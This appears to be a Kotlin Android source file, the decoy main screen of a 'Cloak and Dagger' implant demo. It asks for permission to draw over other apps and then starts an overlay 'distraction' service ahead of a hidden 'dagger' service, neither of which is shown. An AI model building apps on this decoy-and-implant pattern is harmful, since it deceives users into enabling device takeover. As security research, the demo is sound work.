package com.cooperthecoder.implant.decoy

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.support.v7.app.AppCompatActivity
import android.widget.Button
import android.widget.Toast
import com.cooperthecoder.implant.R
import com.cooperthecoder.implant.cloak.CloakService
import com.cooperthecoder.implant.dagger.DaggerService


class MainActivity : AppCompatActivity() {

    companion object {
        val TAG = MainActivity::class.java.name
    }

    private val REQUEST_CODE_OVERLAY = 5463

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val cloakAndDaggerBtn = findViewById<Button>(R.id.btn_cloak_and_dagger_demo)
        cloakAndDaggerBtn.setOnClickListener {
            if (!overlayPermissionRequired()) {
                startCloakService()
            } else {
                Toast.makeText(this, "Allow this app to draw over other apps in settings!", Toast.LENGTH_LONG).show()
            }
        }
    }
    private fun startCloakService() {
        // No need for the cloak if the dagger already came out
        if (!DaggerService.isRunning()) {
            CloakService.startDaggerDistraction(this)
            finish()
        }
    }

    private fun overlayPermissionRequired() = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == REQUEST_CODE_OVERLAY && resultCode == Activity.RESULT_OK && !overlayPermissionRequired()) {
            startCloakService()
        }
    }
}
